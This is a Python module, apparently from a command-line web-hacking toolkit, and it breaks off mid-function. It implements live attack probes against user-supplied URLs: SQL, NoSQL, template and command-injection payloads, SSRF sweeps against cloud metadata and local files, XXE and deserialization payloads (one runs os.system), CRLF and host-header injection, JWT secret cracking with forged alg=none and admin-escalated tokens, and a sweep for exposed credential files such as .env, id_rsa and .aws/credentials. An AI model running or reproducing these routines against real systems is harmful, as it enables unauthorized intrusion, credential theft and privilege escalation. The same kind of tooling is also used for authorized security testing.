"""Hunting probes."""

import base64
import concurrent.futures
import hashlib
import hmac
import json
import os
import random
import re
import socket
import ssl
import string
import subprocess
import time
import urllib.parse

import apikeys

MAX_PAYLOAD_MULT = 30

def _host(url):
    return urllib.parse.urlparse(url).hostname or ""

def _params(url):
    parsed = urllib.parse.urlparse(url)
    return {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}

def _with_param(url, name, value):
    parsed = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qs(parsed.query)
    q[name] = [value]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(q, doseq=True)))

def _req(nf, url, **kw):
    """One request with wall-clock timing — the basis of timing oracles."""
    started = time.time()
    r = nf.http(url, nf.CFG, **kw)
    return r, time.time() - started

def _fingerprint(r):
    return (r.status, len(r.text or ""), (r.text or "")[:400])

def _baseline(nf, url):
    r, elapsed = _req(nf, url, body_limit=400_000)
    return r, elapsed

def _delta(base, r):
    """Normalised difference between a probe and its baseline response."""
    if r.error:
        return None
    b_status, b_len, _ = base
    if r.status != b_status:
        return 1.0
    b_len = max(b_len, 1)
    return abs(len(r.text or "") - b_len) / b_len

def _banner(nf, label, detail=""):
    nf.finding("HIGH", label, detail)

TECH_PATTERNS = {
    "jquery": r"jquery[/.-]?v?(\d+\.\d+(?:\.\d+)?)",
    "wordpress": r"wp-(?:content|includes)/|content=\"WordPress\s*(\d+\.\d+(?:\.\d+)?)",
    "drupal": r"Drupal\s*(\d+(?:\.\d+)?)|sites/(?:all|default)/files",
    "joomla": r"/media/jui/|content=\"Joomla",
    "php": r"PHP/(\d+\.\d+\.\d+)",
    "aspnet": r"ASP\.NET|X-AspNet-Version",
    "nginx": r"nginx/(\d+\.\d+\.\d+)",
    "apache": r"Apache/(\d+\.\d+\.\d+)",
    "openssl": r"OpenSSL/(\d+\.\d+\.\d+[a-z]?)",
    "iis": r"Microsoft-IIS/(\d+\.\d+)",
    "tomcat": r"Apache-Coyote|Tomcat/(\d+\.\d+\.\d+)",
    "laravel": r"laravel_session|Laravel",
    "django": r"csrftoken=|django",
    "express": r"X-Powered-By:\s*Express",
    "react": r"data-reactroot|__REACT_DEVTOOLS",
    "angular": r"ng-version=\"(\d+\.\d+\.\d+)\"",
    "vue": r"__VUE__|data-v-[0-9a-f]{6,}",
    "cloudflare": r"cf-ray",
    "varnish": r"X-Varnish",
    "shopify": r"cdn\.shopify\.com",
    "magento": r"Magento|mage/cookies",
    "woocommerce": r"woocommerce",
    "bootstrap": r"bootstrap[/.-]?v?(\d+\.\d+\.\d+)",
}

def _detect_tech(text):
    found = {}
    for name, pattern in TECH_PATTERNS.items():
        match = re.search(pattern, text, re.I)
        if match:
            version = match.group(1) if match.groups() else "?"
            found[name] = version
    return found

def _cve_search(nf, product):
    url = f"https://cve.circl.lu/api/search/{urllib.parse.quote(product)}"
    r = nf.http(url, nf.CFG, body_limit=3_000_000,
                timeout=max(15, nf.CFG["timeout"]))
    if r.error or r.status != 200:
        return []
    try:
        data = json.loads(r.text)
    except Exception:
        return []
    if isinstance(data, dict):
        data = data.get("results") or data.get("data") or []
    return data if isinstance(data, list) else []

def cmd_version_audit(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    nf.loading("fingerprinting target")
    r = nf.http(url, nf.CFG, body_limit=1_500_000)
    if r.error:
        nf.finding("HIGH", "request failed", r.error[:120])
        return
    blob = " ".join(f"{k}: {v}" for k, v in (r.headers or {}).items()) + " " + (r.text or "")[:200_000]
    tech = _detect_tech(blob)
    nf.section("technology stack")
    if not tech:
        nf.note("no signature matched — the site hides its stack")
        return
    for name, version in sorted(tech.items()):
        nf.kv(name, version)
    nf.loading("correlating cves")
    catalogue = {}
    for name in list(tech)[:8]:
        catalogue[name] = _cve_search(nf, name)
    total = 0
    nf.section("known vulnerabilities")
    for name, rows in catalogue.items():
        if not rows:
            nf.kv(name, "no cve record returned", nf.P.dim)
            continue
        scored = []
        for row in rows[:400]:
            score = row.get("cvss") or row.get("cvss3") or 0
            try:
                score = float(score)
            except (TypeError, ValueError):
                score = 0.0
            scored.append((score, row))
        scored.sort(key=lambda pair: pair[0], reverse=True)
        for score, row in scored[:6]:
            cve = row.get("id") or row.get("cve") or "?"
            summary = (row.get("summary") or "").replace("\n", " ")[:110]
            sev = "CRIT" if score >= 9 else "HIGH" if score >= 7 else "MED" if score >= 4 else "LOW"
            nf.finding(sev, f"{cve}  cvss {score:.1f}", f"{name}: {summary}")
            total += 1
    nf.finding("OK" if total else "INFO", f"{total} cve hit(s) across {len(tech)} tech(s)")
    apikeys.domain_reputation(nf, _host(url))
    nf.save_report(f"version_audit_{_host(url)}", {"url": url, "tech": tech, "hits": total})

def cmd_exploit_lookup(nf):
    nf.section("exploit lookup")
    term = nf.ask("product + version (e.g. apache 2.4.49)")
    if not term:
        return
    if subprocess.call(["which", "searchsploit"], stdout=subprocess.DEVNULL) == 0:
        nf.section("searchsploit")
        try:
            subprocess.call(["searchsploit", "--colour=never"] + term.split()[:4])
        except Exception as exc:
            nf.finding("MED", "searchsploit failed", str(exc)[:80])
    else:
        nf.note("searchsploit not installed — apt install exploitdb")
        nf.loading("querying cve.circl.lu")
        rows = _cve_search(nf, term.split()[0])
        for row in rows[:12]:
            nf.finding("MED", row.get("id", "?"), (row.get("summary") or "")[:110])
    nf.save_report("exploit_lookup", {"term": term, "at": time.strftime("%F %T")})

PARAM_WORDLIST = [
    "id", "page", "file", "path", "url", "redirect", "next", "view", "lang",
    "debug", "test", "admin", "user", "username", "email", "token", "key",
    "api_key", "apikey", "access", "auth", "session", "action", "cmd", "exec",
    "query", "q", "search", "s", "callback", "jsonp", "format", "type", "mode",
    "sort", "order", "limit", "offset", "start", "count", "cat", "category",
    "template", "theme", "module", "include", "require", "load", "download",
    "upload", "img", "image", "src", "source", "target", "host", "domain",
    "site", "link", "ref", "referer", "return", "returnUrl", "continue",
    "dest", "destination", "goto", "out", "u", "r", "p", "c", "v", "f",
]

MARKER = "nfz9x7"

def cmd_param_discovery(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    base, _ = _baseline(nf, url)
    if base.error:
        nf.finding("HIGH", "request failed", base.error[:120])
        return
    base_len = len(base.text or "")
    nf.section(f"parameter discovery — {len(PARAM_WORDLIST)} candidates")
    hits = []

    def probe(name):
        test = _with_param(url, name, MARKER + str(random.randint(0, 999)))
        r = nf.http(test, nf.CFG, body_limit=400_000)
        if r.error:
            return None
        ref = MARKER in (r.text or "")
        delta = abs(len(r.text or "") - base_len) / max(base_len, 1)
        if ref or r.status != base.status or delta > 0.06:
            return (name, r.status, len(r.text or ""), ref)
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=14) as pool:
        for res in pool.map(probe, PARAM_WORDLIST):
            if not res:
                continue
            name, status, size, ref = res
            hits.append(name)
            why = "reflected" if ref else f"delta {size} vs {base_len}" if size != base_len else f"status {status}"
            nf.finding("HIGH", name, why)
    nf.finding("OK" if hits else "INFO", f"{len(hits)} hidden parameter(s)")
    if hits:
        nf.save_report(f"params_{_host(url)}", hits)

FUZZ_PAYLOADS = [
    "'", "\"", "')", "\"><", "`", "\\", "%27", "%00",
    "' OR '1'='1", "' AND 1=1-- -", "\" OR \"\"=\"", "'||'1'='1",
    "1' AND SLEEP(0)--", "1 AND 1=1", "1 AND 1=2",
    "<script>alert(1)</script>", "\"><img src=x onerror=alert(1)>",
    "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "@(7*7)", "{7*7}",
    "${jndi:ldap://127.0.0.1/a}", "../../../etc/passwd", "..\\..\\windows\\win.ini",
    "/etc/passwd%00", "A" * 5000, "%0d%0aX-Injected:nf", "\x00",
    "{{'a'.'b'}}", "${7*'7'}", "{{{7*7}}}",
    "'; sleep 0; --", "() { :; }; echo nf", "-1 OR 1=1",
]

SPECIAL = [("null", "\x00"), ("long", "A" * 5000), ("unicode", "\u4e2d\u6587\ud83d\udca5")]

def cmd_fuzzer(nf):
    raw = nf.ask("url with a parameter  (empty params = auto)")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    if not params:
        nf.finding("MED", "url carries no parameters — run hidden parameter discovery first")
        return
    target = nf.ask("parameter to fuzz", sorted(params)[0])
    if target not in params:
        nf.finding("MED", "parameter not in url", target)
        return
    nf.section(f"anomaly fuzzer — {len(FUZZ_PAYLOADS)} payloads on '{target}'")
    base, base_ms = _baseline(nf, url)
    if base.error:
        nf.finding("HIGH", "baseline failed", base.error[:120])
        return
    base_len = len(base.text or "")
    base_status = base.status
    findings = 0
    for payload in FUZZ_PAYLOADS:
        r, elapsed = _req(nf, _with_param(url, target, payload), body_limit=400_000)
        if r.error:
            continue
        size = len(r.text or "")
        delta = abs(size - base_len) / max(base_len, 1)
        slow = elapsed > max(base_ms * 2.5, base_ms + 1.2)
        if r.status != base_status:
            findings += 1
            nf.finding("HIGH", f"status {base_status}->{r.status}", payload[:60])
        elif slow:
            findings += 1
            nf.finding("MED", f"timing {elapsed:.2f}s vs {base_ms:.2f}s", payload[:60])
        elif delta > 0.35 and len(payload) < 40:
            findings += 1
            nf.finding("MED", f"body delta {delta*100:.0f}%", payload[:60])
    nf.finding("OK" if not findings else "HIGH", f"{findings} anomaly signal(s)")
    if findings:
        nf.save_report(f"fuzz_{_host(url)}", {"url": url, "param": target, "anomalies": findings})

DELAY = 3

def _timing_hit(nf, url, param, payload, label):
    base, base_ms = _req(nf, url, body_limit=200_000)
    if base.error:
        return False
    r, elapsed = _req(nf, _with_param(url, param, payload), body_limit=200_000,
                      timeout=max(nf.CFG["timeout"], DELAY + 8))
    if r.error:
        return False
    if elapsed > base_ms + DELAY * 0.6:
        nf.finding("HIGH", label, f"{param} = {payload[:60]}  ({elapsed:.1f}s vs {base_ms:.1f}s)")
        return True
    return False

SQLI_TIME = [
    ("mysql", "1' AND SLEEP({d})-- -", "1 AND SLEEP({d})"),
    ("postgres", "1'; SELECT pg_sleep({d})-- -", "1;SELECT pg_sleep({d})"),
    ("mssql", "1'; WAITFOR DELAY '0:0:{d}'-- -", "1;WAITFOR DELAY '0:0:{d}'"),
    ("oracle", "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('nf',{d})-- -", None),
    ("sqlite", "1' AND 1=randomblob(500000000)-- -", None),
]

def cmd_blind_injection(nf):
    raw = nf.ask("url with an injectable parameter")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    if not params:
        nf.finding("MED", "url has no parameters")
        return
    target = nf.ask("parameter", sorted(params)[0])
    if target not in params:
        nf.finding("MED", "parameter not in url", target)
        return
    nf.section(f"blind injection — '{target}'")
    hit = False
    for engine, quote_payload, plain_payload in SQLI_TIME:
        for payload in (quote_payload, plain_payload):
            if not payload:
                continue
            if _timing_hit(nf, url, target, payload.format(d=DELAY), f"time-based sqli ({engine})"):
                hit = True
                break
        if hit:
            break
    a, _ = _req(nf, _with_param(url, target, "1 AND 1=1"), body_limit=300_000)
    b, _ = _req(nf, _with_param(url, target, "1 AND 1=2"), body_limit=300_000)
    if not a.error and not b.error and a.status == b.status:
        spread = abs(len(a.text) - len(b.text)) / max(len(a.text), 1)
        if spread > 0.15:
            nf.finding("HIGH", "boolean sql response split", f"{target}  ({spread*100:.0f}%)")
            hit = True
    if not hit:
        nf.finding("OK", "no timing or boolean signal")
    nf.save_report(f"blind_{_host(url)}", {"url": url, "param": target, "hit": hit})

NOSQL_PAYLOADS = [
    '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

def cmd_nosql(nf):
    raw = nf.ask("url (or login endpoint)")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    if not params:
        nf.finding("MED", "no query parameters to mutate")
        return
    target = nf.ask("parameter", sorted(params)[0])
    nf.section(f"nosql injection — '{target}'")
    base, _ = _baseline(nf, url)
    hit = 0
    for payload in NOSQL_PAYLOADS:
        r = nf.http(_with_param(url, target, payload), nf.CFG, body_limit=300_000)
        if r.error:
            continue
        if _delta(_fingerprint(base), r) is None:
            continue
        if r.status != base.status or abs(len(r.text) - len(base.text)) / max(len(base.text), 1) > 0.2:
            hit += 1
            nf.finding("HIGH", "operator accepted", payload[:60])
    nf.finding("OK" if not hit else "HIGH", f"{hit} nosql signal(s)")

SSTI_PROBES = [
    ("twig/jinja", "{{7*7}}", "49"),
    ("jinja alt", "{{7*'7'}}", "7777777"),
    ("freemarker", "${7*7}", "49"),
    ("erb/ejs", "<%= 7*7 %>", "49"),
    ("ruby", "#{7*7}", "49"),
    ("velocity", "#set($x=7*7)$x", "49"),
    ("razor", "@(7*7)", "49"),
    ("smarty", "{7*7}", "49"),
    ("handlebars", "{{#with \"x\"}}{{this}}{{/with}}", "x"),
]

CMDI_PROBES = [
    ("semicolon", "; sleep {d}", None),
    ("pipe", "| sleep {d}", None),
    ("ampersand", "&& sleep {d}", None),
    ("subshell", "$(sleep {d})", None),
    ("backtick", "`sleep {d}`", None),
    ("newline", "%0a sleep {d}", None),
    ("windows", "& timeout /t {d}", None),
]

def cmd_ssti_cmdi(nf):
    raw = nf.ask("url with a reflected parameter")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    if not params:
        nf.finding("MED", "url has no parameters")
        return
    target = nf.ask("parameter", sorted(params)[0])
    if target not in params:
        nf.finding("MED", "parameter not in url", target)
        return
    nf.section(f"template & command injection — '{target}'")
    hits = 0
    for engine, payload, marker in SSTI_PROBES:
        r = nf.http(_with_param(url, target, payload), nf.CFG, body_limit=400_000)
        if r.error:
            continue
        if marker and marker in (r.text or "") and payload not in (r.text or ""):
            hits += 1
            nf.finding("HIGH", f"ssti ({engine})", f"{target} = {payload}")
    for label, payload, _ in CMDI_PROBES:
        if _timing_hit(nf, url, target, payload.format(d=DELAY), f"command injection ({label})"):
            hits += 1
    nf.finding("OK" if not hits else "HIGH", f"{hits} injection signal(s)")

SSRF_TARGETS = [
    ("loopback http", "http://127.0.0.1:{port}/"),
    ("loopback ssh", "http://127.0.0.1:22/"),
    ("aws metadata", "http://169.254.169.254/latest/meta-data/"),
    ("gcp metadata", "http://metadata.google.internal/computeMetadata/v1/"),
    ("file passwd", "file:///etc/passwd"),
    ("file win", "file:///c:/windows/win.ini"),
    ("dict", "dict://127.0.0.1:11211/stat"),
    ("gopher", "gopher://127.0.0.1:6379/_INFO"),
]

SSRF_PARAMS = ("url", "uri", "link", "src", "source", "dest", "destination",
               "redirect", "next", "return", "target", "host", "site", "feed",
               "callback", "webhook", "proxy", "image", "img", "file", "load")

def cmd_ssrf(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    candidates = [p for p in params if p.lower() in SSRF_PARAMS] or list(params)
    if not candidates:
        nf.finding("MED", "no parameter to test")
        return
    port = nf.ask("local port to reflect", "80")
    nf.section(f"ssrf sweep — {len(candidates)} param(s)")
    hits = 0
    for param in candidates:
        for label, template in SSRF_TARGETS:
            payload = template.format(port=port) if "{port}" in template else template
            r, elapsed = _req(nf, _with_param(url, param, payload), body_limit=400_000,
                              timeout=max(nf.CFG["timeout"], 12))
            if r.error:
                continue
            text = r.text or ""
            if "root:x:" in text or "[extensions]" in text:
                hits += 1
                nf.finding("HIGH", f"file read via {param}", label)
            elif "meta-data" in text or "ami-id" in text or "computemetadata" in text.lower():
                hits += 1
                nf.finding("HIGH", f"cloud metadata via {param}", label)
            elif label.startswith("dict") and "STAT" in text:
                hits += 1
                nf.finding("HIGH", "dict protocol responded", param)
            elif label.startswith("loopback") and elapsed > 2.5 and r.status < 500:
                hits += 1
                nf.finding("MED", "possible blind ssrf", f"{param} -> {label} ({elapsed:.1f}s)")
    nf.finding("OK" if not hits else "HIGH", f"{hits} ssrf signal(s)")

XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nf [ <!ENTITY xxe SYSTEM "{target}"> ]>
<root><data>&xxe;</data></root>"""

def cmd_xxe(nf):
    raw = nf.ask("xml endpoint url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    target = nf.ask("entity target", "file:///etc/passwd")
    nf.section("xxe probe")
    xml = XXE_TEMPLATE.format(target=target)
    r = nf.http(url, nf.CFG, method="POST", body_limit=400_000, body=xml,
                extra_headers={"Content-Type": "application/xml"})
    if r.error or r.status >= 500:
        form = "xml=" + urllib.parse.quote(xml)
        alt = nf.http(url, nf.CFG, method="POST", body=form, body_limit=400_000,
                      extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
        if not alt.error:
            r = alt
    if r.error:
        nf.finding("HIGH", "request failed", r.error[:120])
        return
    text = r.text or ""
    if "root:x:" in text or "[extensions]" in text:
        nf.finding("HIGH", "xxe file disclosure", target)
    elif r.status >= 500 and ("exception" in text.lower() or "error" in text.lower()):
        nf.finding("MED", "parser error on entity", "blind xxe possible")
    else:
        nf.finding("OK", "no entity expansion observed")
    nf.save_report(f"xxe_{_host(url)}", {"url": url, "target": target})

DESER_PROBES = [
    ("java", "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="),
    ("php", 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}'),
    ("python", "\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00)\x94."),
    ("dotnet", "AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0="),
    ("yaml", "!!python/object/apply:os.system ['id']"),
]

def cmd_deserialization(nf):
    raw = nf.ask("url / endpoint")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    target = nf.ask("parameter", sorted(params)[0] if params else "data")
    nf.section("deserialization surface")
    hits = 0
    for label, payload in DESER_PROBES:
        test = _with_param(url, target, payload) if params else \
            f"{url}{'&' if '?' in url else '?'}{target}={urllib.parse.quote(payload)}"
        r = nf.http(test, nf.CFG, body_limit=300_000)
        if r.error:
            continue
        text = (r.text or "").lower()
        if r.status >= 500 and any(w in text for w in ("traceback", "exception", "stack", "unserialize", "deserial")):
            hits += 1
            nf.finding("HIGH", f"{label} deserialization error", f"status {r.status}")
        elif "invalid stream header" in text or "could not deserialize" in text:
            hits += 1
            nf.finding("MED", f"{label} parser reacted", target)
    nf.finding("OK" if not hits else "HIGH", f"{hits} deserialization signal(s)")

def cmd_cors(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    nf.section("cors misconfiguration")
    origins = ("https://evil.example", "null", f"https://{_host(url)}.evil.example")
    hits = 0
    for origin in origins:
        r = nf.http(url, nf.CFG, body_limit=200_000,
                    extra_headers={"Origin": origin})
        if r.error:
            continue
        headers = {k.lower(): str(v) for k, v in (r.headers or {}).items()}
        allow = headers.get("access-control-allow-origin", "")
        creds = headers.get("access-control-allow-credentials", "").lower() == "true"
        if allow in ("*", origin):
            sev = "HIGH" if creds and allow != "*" else "MED"
            hits += 1
            nf.finding(sev, f"acao: {allow}", f"origin {origin}" + (" + credentials" if creds else ""))
    nf.finding("OK" if not hits else "HIGH", f"{hits} cors issue(s)")

def cmd_host_header(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    nf.section("host header injection")
    poison = "nf-hostcheck.example"
    base = nf.http(url, nf.CFG, body_limit=300_000)
    if base.error:
        nf.finding("HIGH", "request failed", base.error[:100])
        return
    variants = (
        ("Host", {"Host": poison}),
        ("X-Forwarded-Host", {"X-Forwarded-Host": poison}),
        ("X-Host", {"X-Host": poison}),
        ("X-Forwarded-Server", {"X-Forwarded-Server": poison}),
        ("Forwarded", {"Forwarded": f"host={poison}"}),
    )
    hits = 0
    for label, headers in variants:
        r = nf.http(url, nf.CFG, body_limit=300_000, extra_headers=headers)
        if r.error:
            continue
        if poison in (r.text or ""):
            hits += 1
            nf.finding("HIGH", f"{label} reflected", "password-reset poisoning candidate")
        elif r.status != base.status:
            nf.finding("LOW", f"{label} changed status", f"{base.status} -> {r.status}")
    nf.finding("OK" if not hits else "HIGH", f"{hits} host header reflection(s)")

def cmd_crlf(nf):
    raw = nf.ask("url with a parameter")
    if not raw:
        return
    url = nf.normalize_url(raw)
    params = _params(url)
    if not params:
        nf.finding("MED", "url has no parameters")
        return
    target = nf.ask("parameter", sorted(params)[0])
    nf.section("crlf header injection")
    marker = "X-Nf-Injected"
    payloads = [
        f"%0d%0a{marker}:1",
        f"%0a{marker}:1",
        f"%E5%98%8A%E5%98%8D{marker}:1",
        f"%0d%0aSet-Cookie:nfcrlf=1",
    ]
    hits = 0
    for payload in payloads:
        r = nf.http(_with_param(url, target, payload), nf.CFG, allow_redirects=False, body_limit=200_000)
        if r.error:
            continue
        keys = {k.lower() for k in (r.headers or {})}
        if marker.lower() in keys:
            hits += 1
            nf.finding("HIGH", "header injected", payload[:50])
        elif "nfcrlf" in str(r.headers.get("Set-Cookie", "")):
            hits += 1
            nf.finding("HIGH", "cookie injected", payload[:50])
    nf.finding("OK" if not hits else "HIGH", f"{hits} crlf signal(s)")

JWT_SECRETS = [
    "secret", "password", "changeme", "test", "1234", "12345", "admin",
    "jwt", "jwtsecret", "supersecret", "mysecret", "key", "private",
    "default", "dev", "qwerty", "letmein", "token", "auth", "s3cr3t",
    "your-256-bit-secret", "secretkey", "jsonwebtoken", "nxtf0und",
]

def _b64url(raw):
    if isinstance(raw, str):
        raw = raw.encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def _b64url_dec(text):
    pad = "=" * (-len(text) % 4)
    try:
        return base64.urlsafe_b64decode(text + pad)
    except Exception:
        return b""

def cmd_jwt(nf):
    nf.section("jwt attack surface")
    token = nf.ask("jwt")
    if not token or token.count(".") < 2:
        nf.finding("MED", "not a jwt")
        return
    header_b, payload_b, sig_b = token.split(".")[:3]
    try:
        header = json.loads(_b64url_dec(header_b))
        payload = json.loads(_b64url_dec(payload_b))
    except Exception:
        nf.finding("MED", "could not decode segments")
        return
    nf.kv("alg", header.get("alg"))
    nf.kv("typ", header.get("typ"))
    for key in ("iss", "aud", "sub", "scope", "role", "admin", "exp", "iat", "nbf"):
        if key in payload:
            nf.kv(f"claim {key}", str(payload[key])[:80])
    now = time.time()
    if "exp" in payload:
        left = payload["exp"] - now
        nf.kv("expires", f"{left/3600:.1f}h", nf.P.bad if left < 0 else nf.P.ok)
    alg = str(header.get("alg", "")).upper()
    if alg == "NONE" or alg == "":
        nf.finding("HIGH", "alg none accepted by this token", "forge unsigned")
    forged = _b64url(json.dumps({"alg": "none", "typ": "JWT"})) + "." + _b64url(json.dumps(payload)) + "."
    nf.kv("alg=none variant", forged[:90] + "…")
    if alg.startswith("HS"):
        nf.loading("cracking hmac secret")
        algo = hashlib.sha256 if alg == "HS256" else hashlib.sha512 if alg == "HS512" else hashlib.sha1
        signing_input = f"{header_b}.{payload_b}".encode()
        try:
            signature = _b64url_dec(sig_b)
        except Exception:
            signature = b""
        for secret in JWT_SECRETS:
            candidate = hmac.new(secret.encode(), signing_input, algo).digest()
            if hmac.compare_digest(candidate, signature):
                nf.finding("HIGH", "hmac secret recovered", secret)
                break
        else:
            nf.note("secret not in the built-in list")
    elevated = dict(payload)
    for key in ("role", "admin", "is_admin", "scope"):
        if key in elevated:
            elevated[key] = "admin" if key != "scope" else "admin read write"
    nf.kv("escalated payload", _b64url(json.dumps(elevated))[:90] + "…")
    nf.save_report("jwt_analysis", {"header": header, "payload": payload})

GQL_ENDPOINTS = ("/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql", "/index.php?graphql")
GQL_INTROSPECT = {"query": "{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"}

def cmd_graphql(nf):
    raw = nf.ask("base url")
    if not raw:
        return
    base = nf.normalize_url(raw).rstrip("/")
    nf.section("graphql introspection")
    found = None
    for path in GQL_ENDPOINTS:
        r = nf.http(base + path, nf.CFG, method="POST", body_limit=2_000_000,
                    extra_headers={"Content-Type": "application/json"})
        if r.error:
            continue
        if r.status == 200 and "__schema" in (r.text or ""):
            found = (base + path, r.text)
            break
    if not found:
        nf.finding("MED", "no introspectable graphql endpoint")
        return
    url, text = found
    nf.finding("HIGH", "introspection enabled", url)
    try:
        data = json.loads(text)["data"]["__schema"]["types"]
    except Exception:
        nf.finding("LOW", "schema present but unparsable")
        return
    objects = [t for t in data if t.get("kind") == "OBJECT" and not str(t.get("name", "")).startswith("__")]
    nf.kv("types", len(objects))
    for obj in objects[:25]:
        fields = [f["name"] for f in (obj.get("fields") or [])][:10]
        nf.kv(obj["name"], ", ".join(fields), nf.P.ok)
    nf.save_report(f"graphql_{_host(url)}", [o["name"] for o in objects])

SENSITIVE_PATHS = [
    ".env", ".env.bak", ".env.local", ".git/HEAD", ".git/config", ".gitignore",
    ".svn/entries", ".hg/", ".DS_Store", "wp-config.php", "wp-config.php.bak",
    "config.php", "config.php.bak", "config.json", "config.yml", "config.yaml",
    "settings.py", "settings.json", "database.yml", "web.config", "app.config",
    "backup.zip", "backup.tar.gz", "backup.sql", "db.sql", "dump.sql", "data.sql",
    "site.zip", "www.zip", "public.zip", "source.zip", "backup.rar", "old.zip",
    "phpinfo.php", "info.php", "test.php", "admin.php", "shell.php", "upload.php",
    "server-status", "server-info", "actuator", "actuator/env", "actuator/health",
    "swagger.json", "openapi.json", "swagger-ui.html", "api-docs", "redoc.html",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
    "package.json", "composer.json", "composer.lock", "yarn.lock", "Gemfile",
    "id_rsa", "id_rsa.pub", "id_dsa", ".ssh/id_rsa", "credentials.json",
    "service-account.json", "firebase.json", "GoogleService-Info.plist",
    ".aws/credentials", ".docker/config.json", "docker-compose.yml",
    "Dockerfile", "Jenkinsfile", ".travis.yml", ".github/workflows/ci.yml",
]

CONTENT_SIGNATURES = {
    "env": r"(?m)^[A-Z0-9_]*(KEY|SECRET|TOKEN|PASSWORD|DB_|AWS_)\s*=",
    "git": r"ref: refs/heads/|\[core\]",
    "sql": r"(?i)(INSERT INTO|CREATE TABLE|mysqldump)",
    "key": r"-----BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY-----",
    "json": r"^\s*[\[{]",
    "xml": r"^\s*<\?xml",
    "php_source": r"<\?php",
    "aws": r"AKIA[0-9A-Z]{16}",
}

def _sniff(path_hint, text):
    for label, pattern in CONTENT_SIGNATURES.items():
        if re.search(pattern, text[:20_000]):
            return label
    return None

def cmd_sensitive_files(nf):
    raw = nf.ask("base url")
    if not raw:
        return
    base = nf.normalize_url(raw).rstrip("/")
    nf.section(f"sensitive file sweep — {len(SENSITIVE_PATHS)} paths")
    hits = []

    def probe(path):
        r = nf.http(f"{base}/{path}", nf.CFG, body_limit=300_000,
                    timeout=min(8, max(3, nf.CFG["timeout"])), allow_redirects=False)
        if r.error or r.status not in (200, 401, 403):
            return None
        text = r.text or ""
        if r.status == 200:
            if "<html" in text[:200].lower() and path not in ("server-status", "swagger-ui.html"):
                return None
            if "not found" in text[:400].lower() or "404" in text[:120]:
                return None
            sig = _sniff(path, text)
            return (path, r.status, len(text), sig)
        return (path, r.status, 0, "restricted")

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as pool:
        for res in pool.map(probe, SENSITIVE_PATHS):
            if not res:
                continue
            path, status, size, sig = res
            hits.append(res)
            sev = "HIGH" if status == 200 and sig in ("env", "key", "aws", "sql", "git") else "MED"
            nf.finding(sev, f"{status} /{path}", f"{size} B  {sig or ''}")
    nf.finding("OK" if not hits else "HIGH", f"{len(hits)} reachable path(s)")
    if hits:
        nf.save_report(f"files_{_host(base)}", [{"path": p, "status": s, "bytes": b, "sig": g} for p, s, b, g in hits])

SECRET_PATTERNS = {
    "aws access key": r"AKIA[0-9A-Z]{16}",
    "aws secret": r"(?i)aws.{0,20}(?:secret|private).{0,20}['\"]([A-Za-z0-9/+=]{40})['\"]",
    "google api": r"AIza[0-9A-Za-z\-_]{35}",
    "stripe live": r"sk_live_[0-9a-zA-Z]{24,}",
    "stripe test": r"sk_test_[0-9a-zA-Z]{24,}",
    "github token": r"gh[pousr]_[A-Za-z0-9]{36,}",
    "slack token": r"xox[baprs]-[0-9a-zA-Z-]{10,48}",
    "discord token": r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}",
    "discord webhook": r"https://discord(?:app)?\.com/api/webhooks/\d+/[\w-]+",
    "telegram bot": r"\d{8,10}:AA[\w-]{33}",
    "firebase": r"https://[a-z0-9-]+\.firebaseio\.com",
    "openai": r"sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}",
    "private key": r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----",
    "jwt": r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    "bearer": r"(?i)authorization\s*[:=]\s*['\"]?Bearer\s+[A-Za-z0-9\-._~+/]{20,}",
    "generic key": r"(?i)(?:api[_-]?key|apikey|access[_-]?token|secret[_-]?key)\s*[:=]\s*['\"]([A-Za-z0-9\-_]{16,})['\"]",
}

def _redact(value):
    value = value.strip()
    if len(value) <= 10:
        return value[:4] + "…"
    return value[:6] + "…" + value[-4:] + f" ({len(value)} chars)"

def cmd_js_secrets(nf):
    raw = nf.ask("url")
    if not raw:
        return
    url = nf.normalize_url(raw)
    nf.loading("collecting script sources")
    page = nf.http(url, nf.CFG, body_limit=2_000_000)
    if page.error:
        nf.finding("HIGH", "request failed", page.error[:120])
        return
    sources = re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", page.text or "", re.I)
    resolved = []
    for src in sources[:20]:
        absolute = urllib.parse.urljoin(url, src)
